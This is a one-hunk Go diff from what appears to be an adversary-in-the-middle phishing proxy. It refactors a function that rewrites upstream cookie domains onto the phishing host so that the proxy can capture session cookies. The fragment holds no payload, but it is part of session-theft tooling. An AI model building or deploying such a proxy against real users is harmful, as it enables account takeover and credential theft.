@@ -45,7 +45,7 @@ func rewriteCookieDomain(upstreamDomain string, p *aitm.Phishlet) string {
 	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
 	for _, proxyHost := range p.ProxyHosts {
 		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
-			return proxyHost.PhishSubdomain + "." + p.BaseDomain
+			return proxyHost.PhishHost(p.BaseDomain)
 		}
 	}
 	return upstreamDomain
